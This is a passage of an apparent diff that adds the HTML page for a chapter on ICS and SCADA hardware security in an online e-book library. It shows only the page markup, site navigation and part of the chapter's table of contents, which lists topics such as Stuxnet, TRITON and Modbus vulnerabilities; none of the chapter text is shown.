@@ -1,0 +1,3954 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  
+    <meta name="description" content="Pustakālaya, a library of books on Indian knowledge traditions, science, technology and language, read page by page in the manner of an e-book reader, online or offline.">
+  
+  
+    <meta name="author" content="Nikhil Kumar Rajput, Ramanujan College, University of Delhi">
+  
+  
+    <link rel="canonical" href="https://nikhilkrajput.github.io/pustakalaya/science/hardware_security/ch31-ics-and-scada-hardware-security.html">
+  
+  
+    <link rel="prev" href="ch30-medical-device-hardware-security.html">
+  
+  
+    <link rel="next" href="ch32-biometric-hardware-security.html">
+  
+  <link rel="icon" href="../../assets/icons/favicon-32.png" sizes="32x32">
+  <link rel="icon" href="../../assets/icons/favicon.svg" type="image/svg+xml">
+  <link rel="manifest" href="../../manifest.webmanifest">
+  <link rel="apple-touch-icon" href="../../assets/icons/apple-touch-icon.png">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Pustakālaya">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="application-name" content="Pustakālaya"><script id="bjp-books" type="application/json">[{"id": "vol01_veda", "lang": "en", "path": "vol01_veda"}, {"id": "vol02_upanisad", "lang": "en", "path": "vol02_upanisad"}, {"id": "vol03_darsana", "lang": "en", "path": "vol03_darsana"}, {"id": "vol04_buddha_jina", "lang": "en", "path": "vol04_buddha_jina"}, {"id": "vol05_yoga", "lang": "en", "path": "vol05_yoga"}, {"id": "vol06_tantra", "lang": "en", "path": "vol06_tantra"}, {"id": "vol07_itihasa", "lang": "en", "path": "vol07_itihasa"}, {"id": "vol08_kavya", "lang": "en", "path": "vol08_kavya"}, {"id": "vol09_sangita_natya", "lang": "en", "path": "vol09_sangita_natya"}, {"id": "vol10_sabda", "lang": "en", "path": "vol10_sabda"}, {"id": "vol11_ganita", "lang": "en", "path": "vol11_ganita"}, {"id": "vol12_jyotisa", "lang": "en", "path": "vol12_jyotisa"}, {"id": "vol13_ayurveda", "lang": "en", "path": "vol13_ayurveda"}, {"id": "vol14_rasayana", "lang": "en", "path": "vol14_rasayana"}, {"id": "vol15_krsi_jiva", "lang": "en", "path": "vol15_krsi_jiva"}, {"id": "vol16_vastu", "lang": "en", "path": "vol16_vastu"}, {"id": "vol17_silpa_karu", "lang": "en", "path": "vol17_silpa_karu"}, {"id": "vol18_rajaniti_dharma", "lang": "en", "path": "vol18_rajaniti_dharma"}, {"id": "vol19_vanijya_samudra", "lang": "en", "path": "vol19_vanijya_samudra"}, {"id": "vol20_yuddha", "lang": "en", "path": "vol20_yuddha"}, {"id": "vol21_bhugola", "lang": "en", "path": "vol21_bhugola"}, {"id": "vol22_manas_siksa", "lang": "en", "path": "vol22_manas_siksa"}, {"id": "vol23_jana_jati", "lang": "en", "path": "vol23_jana_jati"}, {"id": "vol24_samanvaya", "lang": "en", "path": "vol24_samanvaya"}, {"id": "hardware_security", "lang": "en", "path": "science/hardware_security"}, {"id": "drones_missiles", "lang": "en", "path": "science/drones_missiles"}, {"id": "code_to_electrons", "lang": "en", "path": "science/code_to_electrons"}, {"id": "dpi_ndr", "lang": "en", "path": "science/dpi_ndr"}, {"id": "quantum", "lang": "en", "path": "quantum/quantum"}, {"id": "qml", "lang": "en", "path": "quantum/qml"}, {"id": "asic", "lang": "en", "path": "computing/asic"}, {"id": "compute", "lang": "en", "path": "computing/compute"}, {"id": "memory", "lang": "en", "path": "computing/memory"}, {"id": "os", "lang": "en", "path": "computing/os"}, {"id": "databases", "lang": "en", "path": "computing/databases"}, {"id": "datacenters", "lang": "en", "path": "computing/datacenters"}, {"id": "networks", "lang": "en", "path": "computing/networks"}, {"id": "cellular", "lang": "en", "path": "computing/cellular"}, {"id": "ml", "lang": "en", "path": "computing/ml"}, {"id": "security", "lang": "en", "path": "cyber/security"}, {"id": "trust", "lang": "en", "path": "cyber/trust"}, {"id": "optimization_methods", "lang": "en", "path": "courses/optimization_methods"}, {"id": "quantum_computing_applications", "lang": "en", "path": "courses/quantum_computing_applications"}, {"id": "dbms_course", "lang": "en", "path": "courses/dbms_course"}, {"id": "english_book", "lang": "en", "path": "language/english_book"}, {"id": "english_book_hinglish", "lang": "en", "path": "language/english_book_hinglish"}, {"id": "english_book_hi", "lang": "hi", "path": "language/english_book_hi"}]</script><script>
+    try {
+      if ((window.matchMedia && (matchMedia("(display-mode: standalone)").matches || matchMedia("(display-mode: fullscreen)").matches)) || navigator.standalone === true) {
+        document.documentElement.className += " bjp-standalone";
+      }
+    } catch (e) { /* not an installed app */ }
+  </script>
+  <script>
+    /* a book opened from its cover on the shelf: the page stays blank, in the cover's colour, until the reader is up */
+    try {
+      var cv = sessionStorage.getItem("bjp.reader.cover");
+      if (cv && sessionStorage.getItem("bjp.reader.open") === "1") {
+        var c = JSON.parse(cv), de = document.documentElement;
+        de.className += " bjp-booting";
+        if (c && /^#[0-9a-f]{3,8}$/i.test(c.bg || "")) de.style.background = c.bg;
+        setTimeout(function () { de.classList.remove("bjp-booting"); de.style.background = ""; }, 3000);
+      }
+    } catch (e) { /* no session storage: the page simply opens as usual */ }
+  </script>
+
+    
+      
+        <title>31. ICS and SCADA Hardware Security - Pustakālaya</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Serif:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Serif";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+      <link rel="stylesheet" href="../../assets/reader.css">
+    
+      <link rel="stylesheet" href="../../assets/app.css">
+    
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+Devanagari:wght@400;600;700&display=swap">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#311-introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../index.html" title="Pustakālaya" class="md-header__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pustakālaya
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              31. ICS and SCADA Hardware Security
+            
+          </span>
+        </div>
+      </div>
+    </div><a href="../../index.html" class="bjp-libbtn" aria-label="Library: all books" title="Library: all books">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 20V5h4v15M8 20V9h4v11M14 20L12.6 6l3.8-.8 3 14.2M3 20h18"/></svg><span>Library</span>
+    </a>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary bjp-nav bjp-nav--book" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../index.html" title="Pustakālaya" class="md-nav__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    Pustakālaya
+  </label>
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      <li class="md-nav__item bjp-nav-all">
+        <a href="../../index.html" class="md-nav__link" aria-label="All books: back to the library">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 12H5M11 6l-6 6 6 6"/></svg>
+          <span class="md-ellipsis">All books</span>
+        </a>
+      </li>
+      <li class="md-nav__item bjp-nav-book" role="presentation"><span class="bjp-nav-head">Hardware Security</span></li>
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview and preface
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch01-trusted-platform-module-tpm-2-0.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Trusted Platform Module (TPM 2.0)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch02-hardware-security-module-hsm.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Hardware Security Module (HSM)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch03-physically-unclonable-functions-puf.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Physically Unclonable Functions (PUF)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch04-trusted-execution-environment-tee.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Trusted Execution Environment (TEE)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch05-hardware-root-of-trust.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Hardware Root of Trust
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch06-side-channel-attack-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Side-Channel Attack Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch07-hardware-trojan-detection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Hardware Trojan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch08-secure-boot.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. Secure Boot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch09-true-random-number-generator-trng.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. True Random Number Generator (TRNG)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch10-fpga-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. FPGA Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch11-iommu-and-dma-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. IOMMU and DMA Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch12-memory-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. Memory Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch13-anti-tamper-technologies.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. Anti-Tamper Technologies
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch14-hardware-attestation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. Hardware Attestation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch15-automotive-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. Automotive Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch16-post-quantum-cryptography-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. Post-Quantum Cryptography Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch17-jtag-and-debug-interface-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. JTAG and Debug Interface Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch18-hardware-cryptographic-accelerators.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Hardware Cryptographic Accelerators
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch19-secure-key-management.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. Secure Key Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch20-iot-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. IoT Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch21-secure-elements-and-smart-cards.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. Secure Elements and Smart Cards
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch22-fido2-and-webauthn-hardware-security-keys.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. FIDO2 and WebAuthn Hardware Security Keys
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch23-hardware-cryptocurrency-wallets.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Hardware Cryptocurrency Wallets
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch24-network-security-processors.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. Network Security Processors
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch25-cheri-capability-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    25. CHERI Capability Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch26-risc-v-security-extensions.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    26. RISC-V Security Extensions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch27-formal-verification-of-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    27. Formal Verification of Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch28-hardware-supply-chain-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    28. Hardware Supply Chain Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch29-5g-and-telecom-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    29. 5G and Telecom Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch30-medical-device-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    30. Medical Device Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    31. ICS and SCADA Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="ch31-ics-and-scada-hardware-security.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    31. ICS and SCADA Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#311-introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.1 Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#312-purdue-model-and-ot-network-architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.2 Purdue Model and OT Network Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.2 Purdue Model and OT Network Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3121-zone-and-conduit-model-iec-62443" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.2.1 Zone and Conduit Model (IEC 62443)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#313-ics-hardware-platforms" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3 ICS Hardware Platforms
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.3 ICS Hardware Platforms">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3131-siemens-simatic-s7-family" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.1 Siemens SIMATIC S7 Family
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3132-allen-bradley-controllogix-5580" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.2 Allen-Bradley ControlLogix 5580
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3133-honeywell-c300-dcs-controller" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.3 Honeywell C300 DCS Controller
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3134-schneider-electric-modicon-m340-m580" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.3.4 Schneider Electric Modicon M340 / M580
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#314-stuxnet-technical-deep-dive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.4 Stuxnet: Technical Deep-Dive
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.4 Stuxnet: Technical Deep-Dive">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3141-step7-dll-interception" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.4.1 Step7 DLL Interception
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#315-tritontrisis-safety-system-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.5 TRITON/TRISIS: Safety System Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.5 TRITON/TRISIS: Safety System Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3151-technical-attack-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.5.1 Technical Attack Analysis
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3152-post-triton-triconex-security-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.5.2 Post-TRITON Triconex Security Hardening
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#316-crashoverride-industroyer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.6 CRASHOVERRIDE / Industroyer
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#317-modbus-tcp-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.7 Modbus TCP Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="31.7 Modbus TCP Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3171-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        31.7.1 Vulnerabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
